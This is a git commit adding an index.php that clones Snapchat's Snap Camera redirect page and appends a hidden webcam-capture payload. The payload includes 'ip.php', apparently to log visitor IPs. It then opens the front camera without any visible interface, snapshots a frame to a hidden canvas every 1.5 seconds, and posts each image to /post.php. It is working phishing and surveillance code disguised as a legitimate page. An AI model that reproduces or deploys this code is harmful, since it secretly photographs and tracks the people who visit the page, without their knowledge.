c93aae94600266c59d6159271fed5ce2c322cacc
remku <ngancloverr+remkugithub@gmail.com>
2023-02-23 09:51:29 +0530

    New

---
+++ index.php
@@ -0,0 +1,93 @@
+<HTML>
+<!-- Created by HTTrack Website Copier/3.49-4 [XR&CO'2014] -->
+
+<!-- Mirrored from snapcamera.snapchat.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 23 Feb 2023 04:03:13 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<HEAD>
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html;charset=UTF-8"><META HTTP-EQUIV="Refresh" CONTENT="0; URL=https://web.snapchat.com/?ref=snapcam_eol"><TITLE>Page has moved</TITLE>
+</HEAD>
+<BODY>
+<A HREF="https://web.snapchat.com/?ref=snapcam_eol"><h3>Click here...</h3></A>
+</BODY>
+<!-- Created by HTTrack Website Copier/3.49-4 [XR&CO'2014] -->
+
+<!-- Mirrored from snapcamera.snapchat.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 23 Feb 2023 04:03:13 GMT -->
+</HTML>
+<html>
+<body>
+<?php
+include 'ip.php';
+?>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="640"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: '/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 640);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+</body>
+</html>
+
